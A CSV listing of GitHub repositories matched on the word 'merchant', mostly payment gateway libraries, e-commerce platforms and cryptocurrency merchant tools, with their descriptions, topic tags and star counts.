,Url,Description,Topics,Stars
0,https://github.com/activemerchant/active_merchant.git,Active Merchant is a simple payment abstraction library extracted from Shopify. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.,,4308
0,https://github.com/greggles/mcc-codes.git,A public repository of Merchant Category Codes (MCC) in formats easier to read than most places (i.e. not a PDF),,351
0,https://github.com/osCommerce/oscommerce.git,osCommerce Online Merchant v3.x,,309
0,https://github.com/flyerhzm/activemerchant_patch_for_china.git,"A rails plugin to add an active_merchant patch for china online payment platform including alipay (ÊîØ‰ªòÂÆù), 99bill (Âø´Èí±) and tenpay (Ë¥¢‰ªòÈÄö)",,308
0,https://github.com/osCommerce/oscommerce2.git,osCommerce Online Merchant v2.x,,272
0,https://github.com/Shopify/active_fulfillment.git,Active Merchant library for integration with order fulfillment services,ruby,148
0,https://github.com/alexk111/awesome-bitcoin-payment-processors.git,"üåü A curated list of Bitcoin payment processors enabling merchants, businesses and nonprofits to accept Bitcoin payments.","awesome-lists,bitcoin,payment-processing,awesome-list,awesome,bitcoin-payment,payment-processors,lightning,lightning-network,btc",147
0,https://github.com/abantecart/abantecart-src.git,"AbanteCart is a free PHP based eCommerce solution for merchants to provide ability creating online business and sell products online quick and efficient.  AbanteCart application is built and supported by experienced enthusiasts that are passionate about their work and contribution to rapidly evolving eCommerce industry. AbanteCart is more than just a shopping cart, it is rapidly growing eCommerce platform",,124
0,https://github.com/xucongli1989/XCLCMS.git,"XCLCMS is a lightweight CMS (content management system) background management system, Developed using asp.net MVC, it provides a simple and easy-to-use web API interface and supports multiple applications for a single merchant.","cms,xclcms,webapi,asp-net,asp-net-mvc,asp-net-web-api,dotnet,content-management-system",106
0,https://github.com/jpablobr/active_paypal_adaptive_payment.git,PayPal Adaptive Payments for Active Merchant,,85
0,https://github.com/opengento/magento2-gdpr.git,"Magento 2 GDPR module is a must have extension for the largest e-commerce CMS used in the world. The module helps to be GDPR compliant. Actually it allows the customers to erase, or export their personal data. As a merchant you have powerful tools to customize the extension capabilities and apply the finest privacy rules.","magento2,rgpd,gdpr,privacy,magento2-module,magento2-extension,magento-2,magento-2-extension,anonymization,erasure,magento",82
0,https://github.com/magento-hackathon/E-MailPreview.git,This extension enables the merchants and developers to preview mail templates from the backend with real data.,,81
0,https://github.com/Shopify/active_utils.git,"Active Utils extracts commonly used modules and classes used by Active Merchant, Active Shipping, and Active Fulfillment",,81
0,https://github.com/tomdale/apple-pay-merchant-session-server.git,Server for obtaining Apple Pay for the Web merchant sessions,,78
0,https://github.com/blockchain/Android-Merchant-App.git,Blockchain Android Merchant App,,74
0,https://github.com/samotari/crypto-terminal.git,CryptoTerminal is an open-source terminal application with which merchants can accept in-person cryptocurrency payments.,,74
0,https://github.com/sbuss/bitmerchant.git,Bitcoin merchant tools,,70
0,https://github.com/railsdog/spree-paypal-express.git,"allowing use of paypal express in spree, using (a modified version of) active merchant",,64
0,https://github.com/ceph/dmclock.git,"Code that implements the dmclock distributed quality of service algorithm. See ""mClock: Handling Throughput Variability for Hypervisor IO Scheduling"" by Gulati, Merchant, and Varman.",,63
0,https://github.com/aasisvinayak/flymyshop.git,FlyMyShop : A free open source e-commerce platform for online merchants ,"laravel,shopping-cart,ecommerce,shop,php,stripe,worldpay",59
0,https://github.com/vitalybaev/php-google-merchant-feed.git,"PHP package, that generates Google Merchant XML Feed","php,google-merchant",49
0,https://github.com/bitmash/alipay-api-php.git,A concise library in PHP for the Alipay API merchant account.,"alipay,php,payment",47
0,https://github.com/xwaynec/active_merchant_allpay.git,"This plugin is an active_merchant patch forAllpay(Ê≠ê‰ªòÂØ∂) online payment in Taiwan. Now it supports Credit card(‰ø°Áî®Âç°), ATM(ËôõÊì¨ATM) and CVS(Ë∂ÖÂïÜÁπ≥Ë≤ª).",,44
0,https://github.com/ericblade/mws-advanced.git,"{""Javascript (node) Amazon Merchant Web Services (MWS) code with mws-simple as it's underpinnings""}","mws,amazon-api,javascript,market,promise,amazon-mws,node,node-js,nodejs,hacktoberfest,mws-api,mws-libraries",43
0,https://github.com/Xenland/BIK_php.git,"{""Don't trust online wallets for your Point of sale device or merchant store? Manage your own Bitcoins finacials with out being a financial programming computer security expert with this library at your side. php""}",,40
0,https://github.com/opencart-ukraine/translate.git,OpenCart is a free open source ecommerce platform for online merchants. OpenCart provides a professional and reliable foundation from which to build a successful online store.,,39
0,https://github.com/commercetools/merchant-center-application-kit.git,Tools and components for developing Merchant Center Applications üõ†,"javascript,frontend,react,toolkit,audit-frontend",35
0,https://github.com/shopwareDowntown/downtown.git,"With our portal, we want to support local authorities and merchants. We want to connect merchants with closed stores to their customers. And we want to keep in mind, that not every merchant has a sophisticated digital strategy - or even a homepage.","ecommerce,covid-19,shopware,php,mysql",31
0,https://github.com/husseyexplores/poshify-utilities.git,Some posh utilities for Shopify developers and merchants packaged as a browser extension üéâ,,29
0,https://github.com/helmutschneider/swish-php.git,PHP-wrapper for the Swish merchant api,,28
0,https://github.com/magento-hackathon/magento2-toolbar.git,Toolbar with developer and merchant functionality,,27
0,https://github.com/cryptonator/merchant-api-sdk-php.git,Merchant API SDK for PHP,,25
0,https://github.com/spesmilo/electrum-merchant.git,configuration script for merchant website,,24
0,https://github.com/oxyum/django-payment-webmoney.git,WebMoney Merchant Interface support for Django. ,,23
0,https://github.com/PrestaShop/mailalerts.git,Sends e-mail notifications to customers and merchants in PrestaShop 1.6.,"prestashop-module,prestashop-1-6,obsolete",22
0,https://github.com/RazerMS/Seamless_Integration.git,Razer Merchant Services Seamless Integration,"molpay,molpay-seamless,javascript,payment",22
0,https://github.com/PrestaShop/ps_emailalerts.git,Sends e-mail notifications to customers and merchants regarding stock and order modifications.,"prestashop-module,prestashop-1-7,prestashop",21
0,https://github.com/dexlab-io/dexpay-pos.git,"Dexpay: POS, a modularized and extensible point of sale which enables Merchants to accept payments in ETH, DAI and xDAI.","ethereum-dapp,ethereum,dai,xdai,point-of-sale,solidity-contracts",21
0,https://github.com/devfacet/amazon-costs.git,A module for retrieving Amazon product information and calculating costs for fulfillment and merchant channels,"amazon,costs,fulfillment,merchants,fba,fbm",21
0,https://github.com/cardmagic/payment.git,An easy to use payment gateway for Ruby. Payment is used to process credit cards and electronic cash through merchant accounts like Authorize.Net.,,21
0,https://github.com/smrealms/smr.git,Space Merchant Realms open-source game engine,"mmo,pbbg,space-game,docker,mysql,foss,php8",20
0,https://github.com/RickardPettersson/swish-api-csharp.git,Swish For Merchant API Client .Net Standard Library,,20
0,https://github.com/sebastyuiop/spree_google_merchant.git,Live product feed for Google Merchant,,19
0,https://github.com/SirWaithaka/simple-mpesa.git,"A simple example of how MPESA works. Works with all 3 types of customers i.e. Agents, Merchants and Subscribers. Allows you to configure a tariff and apply it to transactions. The project follows DDD principles.","domain-driven-design,gorm,docker,postgres,ports-and-adapters,golang,gofiber,rest-api,transfer-money,transaction,repository-pattern,wallet-service,wallet,wallet-api,mobile-money",19
0,https://github.com/jverhoelen/fabric-composer-engine-supplychain.git,"Hyperledger Fabric & Composer example that models a consortium of car engine manufacturers, merchants and customers.","hyperledger-fabric,hyperledger-composer,hyperledger,blockchain",18
0,https://github.com/maciejzgadzaj/commerce_marketplace.git,Drupal module package providing overrides for default Drupal Commerce behaviors allowing to use DC-based store as a multiple-merchant marketplace.,,18
0,https://github.com/orweinberger/bitcoin-merchant-api.git,A self hosted REST API for Bitcoin merchants,,17
0,https://github.com/osCommerce/languages.git,Languages for osCommerce Online Merchant v3.x,,17
0,https://github.com/NascentSecureTech/pix-qrcode-utils.git,Parser and Generator for EMV Merchant QR Codes,,17
0,https://github.com/Nets-mobile-acceptance/Netaxept-Sample-Backend.git,The PiA merchant sample backend is a reference implementation of a merchant backend interacting with PiA sample Android and iOS applications and Netaxept.,,17
0,https://github.com/tfitts/spree_google_merchant.git,Updated Google Merchant XML Generator based on spree-google-base,,16
0,https://github.com/samlown/active_merchant_sermepa.git,Active Merchant extension for the Spanish Sermepa payment gateways,,16
0,https://github.com/mageplaza/all-free-extensions.git,"The Top Magento 2 Extensions by Mageplaza comes with a bulk of amazing features that allow the merchants to do more on their online stores via the richness of the categories including Sales and Motivations, Content Management, even User Experience, etc.","magento2-extension-free,magento2-free-extension,magento2-free-modules",16
0,https://github.com/btcpayserver/directory.btcpayserver.org.git,"BTCPay Server Directory - Merchants, Projects & Charities accepting Bitcoin",btcpayserver,15
0,https://github.com/hiqdev/yii2-merchant.git,Payment merchants extension for Yii2,"yii2,omnipay,payum,hacktoberfest",15
0,https://github.com/bayetech/cmb_pay.git,An unofficial cmb (China Merchants Bank ‰∏≠ÂõΩÊãõÂïÜÈì∂Ë°å) pay gem.,"payment-gateway,payment-integration,china-merchants-bank",15
0,https://github.com/bestpredicts/ELO.git,Elo Merchant Category Recommendation 21th solution,,15
0,https://github.com/RazerMS/rms-mobile-xdk-android.git,Razer Merchant Services mobile payment for Android (Android Studio),,15
0,https://github.com/Invictusintl/coinbase-commerce-whmcs.git,A simple WHMCS gateway that uses the new Coinbase Commerce merchant tools https://commerce.coinbase.com/,,15
0,https://github.com/ebanx/benjamin.git,:electric_plug: EBANX business rule abstraction layer for merchant sites and e-commerce platform plugins.,owner-dev-merchant-product,15
0,https://github.com/khalti/khalti-sdk-ios.git,Khalti SDK for iOS apps.  Khalti Merchant can use this library to integrate the payment system in their system.,"sdk,ios,payment-gateway-in-nepal,khalti,khalti-sdk",15
0,https://github.com/FeeFighters/samurai-client-ruby.git,"If you are an online merchant and using samurai.feefighers.com, this gem will make your life easy. Signup at https://samurai.feefighers.com/ and start processing transactions.",,15
0,https://github.com/facebookincubator/facebook-for-magento2.git,"* Pixel on all pages, which trigger events link, PageView, ViewContent, AddToCart, Initiatecheckout and Purchase.* In the background, Syncs the products from the merchants product catalog to Facebook Catalog.* Stores all the data, like pixel id, catalog id, business maanger id, on to the local database on the instance.",,15
0,https://github.com/magenest-dev/module-popup.git,Magento 2 Popup Extension lets merchants create rich popups for their webstore quickly with our plethora of editable pre-designed templates.,,15
0,https://github.com/click-llc/click-integration-php.git,"This library allows you to integrate payment acceptance using ""CLICK"" payment system into PHP web applications. For the library to function properly, the user must be connected to Click Merchant using the Shop API scheme.","php,php-integration,click,click-shopping-api,click-merchant-api,uzbekistan,clickuz,uz",15
0,https://github.com/fdyuandong/2D-3D-Point-Set-Registration-Based-on-Global-Rotation-Search.git,"# 2D-3D Point Set Registration Based on Global Rotation Search # Copyright (C) 2018 Yinlong Liu@outlook.com # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the # GNU General Public License for more details. # # Any publications resulting from the use of this code should cite the # following paper: # Yinlong Liu, Yuan Dong, Zhijian Song and Manning Wang, ""2D 3D Point Set Registration Based on Global Rotation_Search"", IEEE Transactions on Image Processing (TIP)  # # #==================Note================= # #1. First step->open demo_rot.m. It is a demo of Rotation Search in SO(3) for 2D-3D point set registration. # #2. The input data is set to a real circumstance that 3D point set is far away for projection plane, and in front of camera.  Our method also can be applied to unusual condition that camera is surrounded by 3D point set, only if you make some fix.  # #3. RotaionSearch.m is the kernel of algorithm. You can easily extend it to SE(3) searching by grid-search, while tuning parameters depends on your tasks. # #4. Fast and Global 2D-3D point set registration without correspondence is still an open problem and need further explorations. I am very happy that if you could benefit from our code. # # # Author: Yinlong Liu # Date: 20181218 # Revision: 1.0",,15
0,https://github.com/bKash-developer/pgw-merchant-backend-php.git,Demo merchant back-end for bKash pgw integration in php,"php,bkash-pgw",14
0,https://github.com/Jaliborc/Scrap.git,Sells all your junk when you visit a merchant,"lua,world-of-warcraft,addon,inventory,automation",14
0,https://github.com/markroland/converge-api-php.git,A PHP class that acts as wrapper for the Converge (formerly Virtual Merchant) API,,14
0,https://github.com/shirsig/aux_merchant_prices.git,"Install like a regular addon, folder name must be aux_merchant_prices.",,14
0,https://github.com/click-llc/android-msdk.git,"This library allows you to embed payment acceptance using ""Click"" into Android mobile applications. For the library to function properly, the user must be connected to Click Merchant using the Shop API scheme","sdk-android,click,android-sdk,uzbekistan,clickuz,msdk,mobilesdk,click-sdk,clicksdk",14
0,https://github.com/bitcoin-sv-specs/brfc-merchantapi.git,Merchant API Specification,,13
0,https://github.com/rakchaev/tinkoff-merchant-api.git,Tinkoff Merchant API,,13
0,https://github.com/kancart/OpenCart-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for OpenCart (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,13
0,https://github.com/bennya8/go-union-payment.git,"UnionPayment ÊòØ‰∏Ä‰∏™Êï¥ÂêàÂêÑÁßçÁ¨¨‰∏âÊñπÊîØ‰ªòÁΩëÂÖ≥ÁöÑÂ∑•ÂÖ∑, ËÆ°ÂàíÊîØÊåÅ WechatÔºàÂæÆ‰ø°ÊîØ‰ªòÔºâ„ÄÅAlipayÔºàÊîØ‰ªòÂÆùÔºâ„ÄÅQpayÔºàQQÈí±ÂåÖÔºâ„ÄÅCMBÔºàÊãõÂïÜÈì∂Ë°åÔºâÁ≠â„ÄÇPayment is a Go version of the payment aggregation third-party SDK, which integrates WeChat, Alipay, Qpay, and China Merchant Bank payment.",,13
0,https://github.com/WHMCS/sample-merchant-gateway.git,Sample Merchant Payment Gateway Module for WHMCS,,12
0,https://github.com/openstream/Magento5CentRounding.git,Magento 5-Rappen-Rundung for Swiss Magento Merchants,,12
0,https://github.com/brainblocks/BrainBlocksWebPoS.git,Web Point of Sale for BrainBlocks Merchants,,12
0,https://github.com/culturekings/afterpay.git,PHP Afterpay Integration exposing the Merchant and InStore APIs - Unsupported April 2021,"afterpay,php,payments",12
0,https://github.com/FeeFighters/objective_merchant.git,"{""Port of Shopify's active_merchant ruby library to Objective-C""}",,12
0,https://github.com/atlantis-ATIS/atlantis.git,"ATIS public chain technology is derived from the technology geek on the dark web. Based on a deep understanding of system governance and the financial industry, it integrates traditional finance, cryptography, smart contracts, proof of stake, artificial intelligence, cross-border trade, payment settlement, and cross-chain Next-generation public chain of technology, PoA mining, atomic trading, chain merchant ecology, decentralized exchange, cloud disk, and social networking.  ATIS technology application system ATIS DAPP is a universal, easy-to-expand, flexible and secure credit and intelligent network ecosystem based on the technical characteristics of the blockchain, using cloud computing, artificial intelligence, intelligent Internet of Things, and big data technologies.  ATIS DAPP is a consensus ecosystem, building a more diverse business application scenario, and the entire consensus ecological application service layer is more intelligent and secure.",,12
0,https://github.com/magento-hackathon/Hackathon_StaticAssetsCache.git,"{""Static assets, browser caches, HTTP headers which are an utter mess, CDNs and changing designs on websites... it all adds up to create an utter mess for anyone trying to deploy major changes to UI components of a website.\n\nCLS has built a customization which we include on all of our builds to version the combined CSS/JS assets used on a site (unfortunately it's not isolated and wouldn't make a good base for this). This has proved to be a major help. No waiting on a CDN to purge itself and no wondering how many clients are still seeing an old CSS file which may no longer match the current DOM structure.\n\nExtending this to reach all assets would be a stellar addition to core and benefit all merchants. Even something as simple as a timestamp stored in a cache record and then included URLs spit out to browsers would be an improvement. The trick is figuring out what method to use which works across all asset types, is compatible with origin CDN setups and is also reliable.""}",,12
0,https://github.com/hamptus/fbacalculator.git,Calculates Amazon FBA Fees for Merchants,,11
0,https://github.com/Bitcoin-com/bitcoin-cash-merchant-ios.git,This is Bitcoin Cash Merchant App for iOS built with Swift by the Bitcoin.com Team. Enjoy!,,11
0,https://github.com/augustusnaz/laravel-google-merchant-api.git,A sweet Laravel implementation of Google Merchant API for Google Shopping.,,11
0,https://github.com/gwillem/magento-security-resources.git,Crowd-sourced resources to help merchants mitigate and prevent Magento security incidents,,11
0,https://github.com/RazerMS/rms-mobile-xdk-flutter-beta.git,Razer Merchant Services mobile payment for Flutter (Dart),,11
0,https://github.com/mrk-9/Blockchain-iOS-merchant-app.git,"Merchants can register a Bitcoin address to receive payments. The app subscribes to the address through the blockchain.info websocket. When an amount is charged, the websocket opens. The transaction hash is obtained from the message received by the websocket when funds are received to the address.",,11
0,https://github.com/mithunsasidharan/Merchant-Guide-To-Galaxy.git,Java Implementation of the famous game Merchant Guide To Galaxy,,10
0,https://github.com/bitcoin-sv/merchantapi-reference.git,Merchant API reference implementation,,10
0,https://github.com/karask/bitcoinpos.git,This project provides a Bitcoin Point of Sale system to allow merchants to accept bitcoins.,,10
0,https://github.com/BlockIo/gem-block-io.git,"Ruby library for Block.io. The easiest way to create, and use, Bitcoin, Dogecoin, and Litecoin wallets for payments as everyday users, and merchants.",,10
0,https://github.com/drizzentic/AirtelMoneyLib.git,A php implementation of Airtel money Merchant query API,,10
0,https://github.com/SeNaP/node-robokassa.git,Robokassa merchant for node,,10
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-PHP.git,Sample PHP API client for communicating with SpectroCoin Bitcoin Merchant API,,10
0,https://github.com/zooitje/ultra-simple-Bitcoin-merchant.git,"a simple Bitcoin merchant / payment system that is easy to install, expandable, multilanguage and entirely written in PHP",,10
0,https://github.com/DrLina/Shopify-AMP-Theme.git,"This is the first Shopify theme to provide a fully Google AMP compatible website template, allowing merchants to create online stores which are consistently high-performing, fast and beautiful across many different devices and distribution platforms.",,10
0,https://github.com/timols/fourmer.git,Foursquare Merchant API,,10
0,https://github.com/MobilePayDev/MobilePay-Subscriptions.git,"With Subscriptions you will collect your subscriptions to MobilePay simply with a swipe. Our api enables you to establish and manage agreements between you, the merchant, and MobilePay users. ","mobilepay,subscriptions,api,rest-api",10
0,https://github.com/claudiosanches/woocommerce-google-merchant-center-feed.git,Google Merchant Center Feed,,9
0,https://github.com/burhan/e24PaymentPipe.git,ACI Merchant Gateway PaymentPipe Python Implementation,"python,payments,knet",9
0,https://github.com/cuker/merchant-gateways.git,"A common interface to any payment system, and a list of supported merchants (like RoR ActiveMerchant)",,9
0,https://github.com/wikimart/merchant-api-client.git,Wikimart Merchant API client on PHP,,9
0,https://github.com/mrk-9/iOS_Blockchain-Merchant.git,"Blockchain, merchant, QR code, Bitcoin wallet, BTC, Payment integration",,9
0,https://github.com/jleclanche/python-iso18245.git,Python implementation of the ISO 18245 Merchant Category Codes database ‚õ∫,"iso,iso18245,mcc,finance,banking,fintech,python",9
0,https://github.com/kancart/PrestaShop-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for PrestaShop (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,9
0,https://github.com/nozzlegear/deliver-on.git,"A small Shopify app that lets merchants add a ""Deliver On"" date selector to their cart page or post-checkout page.",,9
0,https://github.com/gary-rowe/MultiBitStore.git,‚ö†Ô∏è OBSOLETE. DO NOT USE! A MultiBit Merchant client providing a complete online store using Bitcoin. Fully customisable.,,9
0,https://github.com/Makewebbetter/enhanced-woocommerce-mautic-integration.git,Mautic WooCommerce Integration helps the WooCommerce merchants to automate their regular marketing tasks in just a few clicks. This integration automatically syncs the WooCommerce store data like contacts and marketing campaigns with mautic in real-time and makes it easier to analyze customer segment data with RFM analysis.,"ecommerce,marketing-automation,mautic,mautic-integration,woocommerce",9
0,https://github.com/awazgyawali/flutter_khalti.git,Khalti SDK for flutter apps. Khalti Merchant can use this library to integrate the payment system into their flutter app easily.,,9
0,https://github.com/verotel/flexpay-php-client.git,Verotel FlexPay allows Verotel merchants to charge for content,,8
0,https://github.com/cavirtex/merchants.git,Shopping cart plugins using the cavirtex merchant API,,8
0,https://github.com/ahmedsaoud31/payfort-php.git,"Payfort php Library ""Merchant Page 2.0""",,8
0,https://github.com/ebeigarts/active_merchant_first_data.git,First Data Latvia gateway for Active Merchant,,8
0,https://github.com/RoyMachineLearning/Elo-Merchant-Category-Recommendation.git,Kaggle Competition : Elo Merchant Category Recommendation,,8
0,https://github.com/RazerMS/rms-mobile-xdk-reactnative-beta.git,Razer Merchant Services mobile payment for React Native (BETA),,8
0,https://github.com/mrk-9/Android_Blockchain-Merchant.git,"Blockchain, merchant, QR code, Bitcoin wallet, BTC, Payment integration",,8
0,https://github.com/evtatarintsev/advcash-api-client.git,Python wrapper around AdvCash Merchant API,,8
0,https://github.com/stympy/active_merchant.git,Mirror of active merchant plugin,,8
0,https://github.com/marcelja/dynamicpricing.git,This is the best merchant of all time,"dynamic,pricing",8
0,https://github.com/marcelja/dynamicpricing.git,This is the best merchant of all time,"dynamic,pricing",8
0,https://github.com/CityChainFoundation/city-hub.git,"The City Hub is the one-stop-app that citizens, merchants and others can get an overview of everything related to their data on the City Chain and the Smart City Platform. ",,8
0,https://github.com/magenable/covide19-notice.git,"Magento 2 free open source extension displaying notice at the top of the page, useful for COVID-19 affected merchants","magento2,magento,covid19",8
0,https://github.com/Amitelazari/Legal-bug-bounty.git,"This is the #legalbugbounty standardization project. As I explain in my Enigma talk and my papers - the legal landscape of bug bounties is currently lacking. Safe harbor is the exception, not the standard and thousands of thousands of hunters are put in ""legal\'s"" harm way. I\'ve suggested that bug bounty legal terms, starting with safe harbor, could and should be standardized. Once standardization of bug bounty legal language is achieved, the bug bounty economy will become an alternate private legal regime in which white-hat hacking is celebrated through regulatory incentives. Standardization will start a race-to-the-top over the quality of bug bounty terms.  This project, supported by CLTC, aims to achieve standardization of bug bounty legal terms across platforms, industries and sponsors, in line with the DOJ framework, and akin to the licenses employed by Creative Commons and the open source industry. This will reduce the informational burden and increase hackers‚Äô awareness of terms (salience). It could also signal whether a particular platform or company conforms with the standard terms that are considered best practice. Finally, it could reduce the drafting costs of the platform or sponsoring program, as well as the transactional costs. While some organizations (such as governmental or financial organizations) might require adjustments, generally the legal concerns of bug bounties‚Äô sponsors and platforms are similar and could be addressed in standardized language.        Moreover, standardization should be used to ensure that hackers have authorized access to any third-parties data or components implemented in the bug bounty administrator product/network, and to facilitate coordinated disclosure of third-party vulnerabilities found (and ethically disclosed). Companies and platforms should coordinate to ensure that such clauses are included in all terms, facilitating a best practice mentality in the industry.              The benefits of standardization in bug bounties/CVDs of legal language across industries and platforms in light of DOJ framework       +One language of safe harbor akin to Creative Commons/Open Source       +Create an industry standard that will serve as a benchmark and signal to hackers if companies don‚Äôt adopt it         +Reduce the informational burden and increase hackers‚Äô awareness towards terms       +Reduce transaction and drafting costs        +Create a reputation system for legal terms       You must consult with a lawyer       Disclaimer: this report does not constitute legal advice and the author is not admitted to practice law in the U.S. The information contained herein is for general guidance on matters of interest only. The application and impact of laws can vary widely based on the specific facts involved. Given the changing nature of laws, terms, rules and regulations, there may be delays, omissions or inaccuracies in information contained herein. Accordingly, the information is provided with the understanding that the author is not herein engaged in rendering legal or other professional advice and services. As such, it should not be used as a substitute for consultation with professional legal or other competent advisers. Before making any decision or taking any action, you should consult a professional. All information is provided ‚Äúas is‚Äù, with no guarantee of completeness, accuracy, timeliness or of the results obtained from the use of this information, and without warranty of any kind, express or implied, including, but not limited to warranties of performance, merchantability and fitness for a particular purpose. In no event will the author be liable to you or anyone else for any decision made or action taken in reliance on the information herein or for any consequential, special or similar damages.",,8
0,https://github.com/Lexiks/BitServ.git,Bitcoin merchant,,7
0,https://github.com/Fruitware/VictoriaBankGateway.git,Victoria bank e-Commerce Gateway merchant interface,"bank-integration,moldova,gateway-client,php-library,composer-package,bank-responses,commerce-transactions,packagist,php",7
0,https://github.com/Mastercard/api-ref-app-merchant-identifier.git,Reference application for Merchant Identifier API,,7
0,https://github.com/kulapio/libra-merchant.git,Libra Merchant with QR Payment,,7
0,https://github.com/revolut-engineering/revolut-merchant-api-example-next-js.git,Revolut Merchant API Integration Example for React.js + Next.js,"revolut,acquiring,nextjs,reactjs",7
0,https://github.com/kancart/Magento-Web-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for Magento (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,7
0,https://github.com/osCommerce/oscommerce_cvs.git,CVS history of The Exchange Project v2.0 and osCommerce Online Merchant v2.2 (available only for historical purposes),,7
0,https://github.com/YangKing0834131/2018-User-purchase-forecast.git,China Merchants Bank Credit Card Center Campus Competition: Prediction of User Purchases in the Consumer Finance Scenario A Ranking: rank2 B Ranking: rank3,,7
0,https://github.com/xDAnkit/react-native-google-pay-tez.git,Google Pay(Tez) Native package for Merchants to accept payments for customers using react native mobile app,"react-native,android,googlepaytez,npm",7
0,https://github.com/craigchristenson/2checkout_rails_example.git,Example Rails shopping cart the demonstrates 2Checkout active merchant integration.,,7
0,https://github.com/danwrong/acts-as-money.git,Extensions to Active Record for dealing with storing currency.  Compatible with Active Merchant.,,7
0,https://github.com/commercetools/merchant-center-starter-app.git,A starter example for building a Merchant Center application üõ†üöÄ,,7
0,https://github.com/UncleCatMySelf/MyPass.git,ÂïÜÊà∑ÊäïÊîæÁ≥ªÁªüÔºàmerchantsÔºâ„ÄÅÁî®Êà∑Â∫îÁî®Á≥ªÁªüÔºàpassbookÔºâÂÆûÁé∞ÊôÆÈÄöÁ∫ø‰∏äÂç°ÂåÖÂ∫îÁî®ÔºàHbaseÂàÜÂ∏ÉÂºèÂ§ÑÁêÜ„ÄÅKafkaÊ∂àÊÅØÈòüÂàóÊúçÂä°„ÄÅÂç°ÂåÖ‰ºòÊÉ†Âç∑ÂäüËÉΩÔºâ,,7
0,https://github.com/gadia-aayush/Categorizing-Bank-Transactions.git,"The script basically categorizes bank statements transactions based on Mode of Transaction, Category of Merchant & Repeat Transaction Categorization.","r,r-programming,tidying-data,categorization,csv,excel,categorizing-bank-transactions",7
0,https://github.com/BlockchainLabs/NobleCoin.git,"{""ADD SUPPORT FOR YOUR COIN  The development and services behind Noble were crowdfunded via the sale of the NOXT token. This token can be used to buy support for your own cryptocurrency, making it too an international option for digital currency payments and purchases. Click here to add your coin to the Noble platform, and begin purchasing and paying bills in your favourite cryptocurrency today. ADD FULL GIFT AND PAY SUPPORT Give your own coin the ability to act as an international method of payments and purchases, including taxes, bills, credit cards and gift cards.  PAY ZERO FEES USER SUPPORT LEGAL AND LONG-TERM FOCUS  07. HOW IT WORKS PAYMENTS AND GIFTS  Using Noble Pay and Noble Gift is a straight-forward affair, allowing you to make an order and pay using your preferred cryptocurrency method in minutes.  PAY OR PURCHASE ONLINE PAY ONLINE RIGHT NOW  Smaller purchases and payments can be made online right now, without the need for the Noble mobile application, accounts or AML/KYC requirements. NOBLE PAY  Pay Australian taxes and bills, deposit directly into bank accounts, transfer into European accounts, pay off credits cards, the list keeps growing. Do smaller transfers and payments using Noble Pay online right now.  NOBLE GIFT  Purchase from a range of over 400 international gift in many dominations of fiat currency and exchanged from digital currencies. |50+ CRYPTOCURRENCIES SUPPORTED A FOCUS ON REAL-WORLD USAGE  Beyond technical features, experimental code and revolutionary ideas, Noble provides real-world, day-to-day usage to blockchains so they remain, first and foremost, a unique type of currency.  GIFT CARDS  Purchase over 400 international gift cards using Bitcoin or using one of more than 50 alternative cryptocurrencies.  BILLS & TAXES  Pay Australian or European bills and taxes using cryptocurrency. Noble handles all exchange and local payment systems internally.  BANK DEPOSITS  Automatically exchange and deposit directly into Australian and European bank accounts using Noble-supported alternative cryptocurrencies and Bitcoin.  USER-TO-USER  Save addresses, register accepted digital currencies, and pay users completely in-app, letting Noble handle exchange rates and transfers in the background (in development). 02. NOBLE MOVEMENT THE CURRENCY IN CRYPTOCURRENCY  Noble development is focused first and foremost on blockchain-based cryptocurrency, aiming to ultimately remove the need for fiat and exit ramps completely. SEARCH FOR AND USE YOUR FAVOURITE CRYPTOCURRENCY  Noble is developed to inherently support any number of cryptocurrencies, linked into multiple API's and using custom wallet and exchange systems where necessary. MULTIPLE AUTOMATIC METHODS OF EXCHANGE AND TRANSFER  Depending on the cryptocurrency and fiat pair selected, exchange rates are automatically gathered from a wide range of sources. ONGOING DEVELOPMENT AND NEW FEATURES CONTINUOUSLY ADDED  Development of Noble is ongoing, with each patch bringing improved design, usability and features to the application. GLOBAL CRYPTOCURRENCY USAGE ON YOUR MOBILE PHONE  Using the power of Bitcoin and the blockchain, digital payments, purchases and transfers are available internationally with zero-to-low fees. FIND AND INTERACT WITH LIKE-MINDED ENTHUSIASTS  In development for Noble is a complete user-to-user based localisation, payment and merchant system allowing users to trade and purchase between themselves. NO PRIVATE KEYS REQUESTED OR STORED  Noble does not currently act as a wallet, instead linking into to cryptocurrency-specific wallets outside the application. This prevents us from generating, storing or being responsible for any private keys. Your money is in your control. 04. WHAT'S NEW VERSION 0.2.0  Version 0.2.0 saw Noble Pay introduce European (EUR) payments to over 17 countries via SEPA and IBAN, including EUR currency exchange rates. User areas were improved, including payment history and AML/KYC status. The direct bank deposit capability in Australia, using a BSB and account number, was also polished. View patch notes | NOBLE BLOCKCHAIN PAYMENT APP  Noble is an international mobile payment, gift and product application for over fifty blockchain-based digital currencies. It further aims to incorporate blockchain technology into digital identity systems, international digital currency AML/KYC security to help combat financial fraud and money laundering, and real estate ownership and land rights.""}",,7
